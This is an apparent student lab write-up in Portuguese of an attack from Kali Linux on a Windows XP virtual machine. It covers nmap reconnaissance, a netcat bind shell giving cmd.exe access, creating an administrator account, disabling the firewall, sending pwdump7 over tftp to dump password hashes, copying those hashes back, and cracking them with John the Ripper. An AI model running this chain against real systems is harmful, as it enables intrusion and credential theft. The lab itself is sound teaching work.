# Simulando um ataque com Kali no Linux

Com as máquinas devidamente criadas e configuradas.
Iniciou-se testes para verificar conectividade.

Após configurar rede NatNetwork para ambas as máquinas
Ping entre as máquinas se estabeleceu bem.

Porém houve alteração do IP do Windowns XP para IP fixo (10.0.2.21).


```
Ip –br a // permite ver as interfaces com os ip atribuídos
```
![image](https://user-images.githubusercontent.com/81317591/211308573-cb42aaa1-701e-46f9-af1c-0c7539a5869d.png)



Executando:
```
Sudo Netdiscover 
```
![image](https://user-images.githubusercontent.com/81317591/211308634-57d5f903-8782-49c4-896b-709759fd93b2.png)

De início não consta nada, porém ao realizar pings com o XP no Kali, ele identifica o IP do XP

 
![image](https://user-images.githubusercontent.com/81317591/211308681-a72e8611-8a15-40ee-ba5f-a727d84e7c67.png)

Como constou no netdiscover o IP do XP utilizou-se:
```
 Nmap -A 10.10.2.0/24
```
![image](https://user-images.githubusercontent.com/81317591/211308733-db2cd65d-1a46-4e05-bd33-da871cc05e29.png)

Ao executar ```nmap -A```  além das portas, também mostrou o sistema operacional, o horário do sistema, level de autenticação, e já identificou name computer e BIOS, assim como Workgroup.

Já a sintaxe ```nmap -sS nos```  forneceu apenas as informações das portas, inclusive a porta 1010/tcp que abrimos (nc -L -p 1010 -e cmd.exe) no XP para explorá-la.
 
![image](https://user-images.githubusercontent.com/81317591/211308951-3f83d9df-a0c7-4727-a76e-eba961b65bf7.png)

Executando ``` nc 10.0.2.21 1010``` , no Kali. Já temos acesso ao XP.

Com acesso, executaremos ``` C:\ qwinsta ``` - Foi verificado utilizador logado, no meu caso Admin1.
> Detalhe: os comandos que serão utilizados, são do XP, 
Rodamos ```C:\ net user Admin9 /add ``` para criar um usuário, Admin9, e logo depois deletado com, ```C:\ net user Admin9 /delete```, e depois criado um Admin11 como mostra imagem a seguir.
![image](https://user-images.githubusercontent.com/81317591/211309023-73aafe06-3a3f-47b4-958f-1bdf13e9156e.png)
 

Ainda utilizando o net user, foi criado um usuário “pirata” e depois adicionado senha ao seu perfil.
Com os comandos ```net user pirata /add``` e depois ```net user pirata 111```
![image](https://user-images.githubusercontent.com/81317591/211309067-14eb8c28-244a-4cf1-befe-fb7cd08449d4.png)

 
Caso necessário podemos remover a senha com o comando ```net user pirata *```
Ao utilizar ```C:\ net localgroup administradores pirata /add``` 

![image](https://user-images.githubusercontent.com/81317591/211309176-1729f2da-d8af-4d70-a658-03b3c84e8f2f.png)






```
C:\ shutdown –s –t 55 ➔ agenda um encerramento ao fim de 55 segundos 
C:\shutdown –a ➔ para o encerramento agendado 
C:\ipconfig /all ➔ ver as configurações IP 
C:\route print ➔ ver rotas/ tabela de roteamento 
```
 ![image](https://user-images.githubusercontent.com/81317591/211309214-fed0f9b9-f91c-4978-9d8a-f050f830cf37.png)

```
C:\arp –a ➔ permite ver a informação a cerca do gateway 
C:\netsh firewall show state ➔ ver o estado da firewall 
C:\netsh firewall show config ➔ verificar as configurações da firewall 
C:\systeminfo ➔ permite ver à quanto tempo a maquina não é desligada 
C:\netsh firewall set opmode disable ➔colocar a firewall como desativada 
C:\netsh firewall set opmode enable ➔ colocar a firewall como ativada
```
 
![image](https://user-images.githubusercontent.com/81317591/211309246-84a7a371-51e9-4b8f-9dc4-646ae4689307.png)


- Capturando a password dos users e fazendo crap das password do user.

> Através do aplicativo “pwdump”, download no kali, este vai ser usado para ser enviado para a máquina xp, para obtermos as senhas. 

Foi criado no kali uma pasta pwdump para descarregar o conteúdo, utilizamos ```unzip pwdump7.zip``` para extrair os arquivos dentro da pasta
vamos fazer uso do tftp para isso é necessário proceder à intalação dos serviços de tftp.

> tftp é um recurso para envio de arquivos entre as máquinas)

Executando ```sudo apt-get install tftpd-hpa tftp-server -y``` ou ```sudo apt-get install tftpd-hpa``` e 
```sudo apt-get install tftpd-server –y```

 ![image](https://user-images.githubusercontent.com/81317591/211309278-fd8f858e-74a0-458c-a237-07e0ca6a0ee6.png)


Fazer a configuração do serviço tftp com o comando: ```sudo nano /etc/default/tftpd-hpa–l```
A linha que tem a linha que tem TFTP_OPTIONS=" --secure” tem de ser alterada para
TFTP_OPTIONS="--secure --create"

![image](https://user-images.githubusercontent.com/81317591/211309331-0ed81ad5-bd5e-4e48-aef8-6f7ad35ed5c0.png)



Copiar os ficheiros do pwdump no KALI para:  /srv/tftp

```
sudo cp pwdump7.exe /srv/tftp
sudo cp libeay32.dll /srv/tftp
```

Na máquina XP criar uma pasta na raiz com nome ataque 
Agora através do KALI executar os comandos no XP dentro da pasta de ataque 
```
tftp -i 10.0.2.15 get libeay32.dll
tftp -i 10.0.2.15 get PwDump7.exe //case sensitive
```

Com isso, conseguimos transferir os dois arquivos do KALI para o XP e agora podemos executar o PwDump7 
 
![image](https://user-images.githubusercontent.com/81317591/211309364-1d70354f-3780-4a0e-9c04-f48f0b9f31eb.png)


Executando ```PwDump7.exe > contas.txt ```
O arquivo contas.txt fica com o conteúdo das passwords encriptadas. 
Agora transferimos o arquivo contas.txt para o KALI, com o comando: ```Tftp -i 10.0.2.15 put contas.txt```
Obtivemos um erro de permissão, permission denied, no KALI, para resolver, utilizamos: /srv , depois, ls -i e então, ```sudo chmod -R 777 tftp``` 
Ao tentar novamente, já obtivemos sucesso na transferência do arquivo. 

  ![image](https://user-images.githubusercontent.com/81317591/211309392-929e3475-80f9-474e-b9e9-0f4ca27e7d75.png)


Dentro da pasta /srv/tftp já podemos abrir o arquivo e ver o arquivo com password encriptado
Utilizamos ```sudo john contas.txt``` e já conseguimos ver os longin e passwords cadastrados no w XP.

 ![image](https://user-images.githubusercontent.com/81317591/211309419-bd4b8a65-67d9-4684-be88-4decd8b8a178.png)


E utilizando ```sudo john conta.txt --wordlist=/diretorioondeandaofile_rockyou.txt```
 
![image](https://user-images.githubusercontent.com/81317591/211309459-f73ecb3c-67ce-4b7e-9d3e-cfec7e5f0712.png)


